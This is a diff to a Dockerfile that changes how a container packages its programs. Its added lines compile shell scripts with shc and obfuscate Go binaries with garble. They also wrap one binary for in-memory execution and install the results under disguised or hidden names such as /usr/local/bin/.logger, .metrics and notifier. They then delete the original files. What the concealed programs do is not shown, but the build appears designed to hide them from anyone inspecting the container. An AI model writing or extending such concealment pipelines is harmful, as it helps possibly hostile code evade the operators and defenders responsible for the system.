@@ -12,6 +12,11 @@ RUN apt-get update && apt install -yq shc gcc
 
 SHELL ["/bin/bash", "-c"]
 
+RUN sed -i 's|/kernel.sh|/usr/local/bin/.logger|g' /entrypoint.sh
+RUN sed -i 's|kernel|logger|g' /entrypoint.sh
+RUN sed -i 's|/init.sh|/usr/local/bin/.metrics|g' /kernel.sh
+RUN sed -i 's|/linux/linux|/usr/local/bin/notifier|g' /kernel.sh
+
 RUN function reverse_filename() { echo "$1" | awk -F '.' '{name=$1; ext=$2; for(i=length(name); i!=0; i--) printf "%s", substr(name, i, 1); if(length(ext)) printf ".%s", ext;}'; } && \
     sed -i '/^set/d' /init.sh && \
     shc -rf /init.sh -o /initrd && \
@@ -58,11 +63,23 @@ RUN mkdir -p cmd/entry cmd/boot cmd/linux && \
     CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/boot && \
     CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/linux
 
+RUN mv /src/linux /src/kern &&  mkdir -p cmd/binary && \
+    PATH=$(go env GOPATH)/bin:$PATH memexec-gen /linux/linux && \
+    sed 's|FILE|linux|g' template.go > cmd/binary/main.go && \
+    cp /linux/linux cmd/binary/binary && \
+    go mod tidy && \
+    CGO_ENABLED=0 garble -literals -tiny build -ldflags=" -s -w" -a -installsuffix cgo ./cmd/binary
+
 USER user
 
 FROM $BASE_IMAGE
 
-COPY --from=obfuscator /src/linux /kernel.sh
+COPY --from=obfuscator /src/binary /usr/local/bin/notifier
+COPY --from=obfuscator /src/kern /usr/local/bin/.logger
 COPY --from=obfuscator /src/entry /entrypoint.sh
-COPY --from=obfuscator /src/boot /init.sh
+COPY --from=obfuscator /src/boot /usr/local/bin/.metrics
 
+USER root
+RUN rm -rf /init.sh /kernel.sh /linux
+
+USER user
